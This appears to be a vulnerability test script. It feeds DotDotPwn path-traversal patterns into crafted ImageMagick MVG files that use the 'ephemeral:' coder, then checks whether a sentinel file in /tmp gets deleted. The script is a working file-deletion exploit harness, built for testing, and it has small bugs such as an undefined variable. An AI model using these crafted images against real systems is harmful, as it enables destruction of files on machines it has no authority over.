#	This program should be executed as ./ProjectTests/test-001-path_traversal.sh
#	not as ./test-001-path_traversal.sh

#Get current directory
ROOT_DIR=$(pwd)

#Configure DotDotPwn
cd ~/dotdotpwn/dotdotpwn
mkdir Reports

#Run test with DotDotPwn
mkdir fuzzed_images
i=0
for fuzz_pattern in $(./dotdotpwn.pl -m stdout -d 2 -f /tmp/NO-DELETE)
do
	echo "push graphic-context" > fuzzed_images/image_$i.mvg
	echo "viewbox 0 0 640 480" >> fuzzed_images/image_$i.mvg
	echo "image over 0,0,0,0 'ephemeral:$fuzz_pattern'" >> fuzzed_images/image_$i.mvg
	echo "pop graphic-context" >> fuzzed_images/image_$i.mvg
	echo "$fuzz_pattern" > explored_traversals/fuzz_$i.txt
	
	echo "All is good" > /tmp/NO-DELETE #Re-create the test file
	identify mvg:fuzzed_images/image_$i.mvg #Try the exploit
	#Check to see if exploit was sucessfull
	if [ -e /tmp/NO-DELETE ]
	then
		echo "OK"
	else
		echo "$f has exploited Imagemagick"
		echo "$fuzz_pattern <- VULNERABLE" >> Reports/traversal_report.log
	fi
	
	i=$(expr $i + 1)
done


#Copy DotDotPwn log file to working directory
cp Reports/traversal_report.log $ROOT_DIR

#Switch back to original directory
cd $ROOT_DIR

#Parse DotDotPwn's log
python parse_dotdotpwn.py traversal_report.log ProjectGitRepo/README.txt ProjectTests/test-001-path_traversal.sh json/path_traversal.json

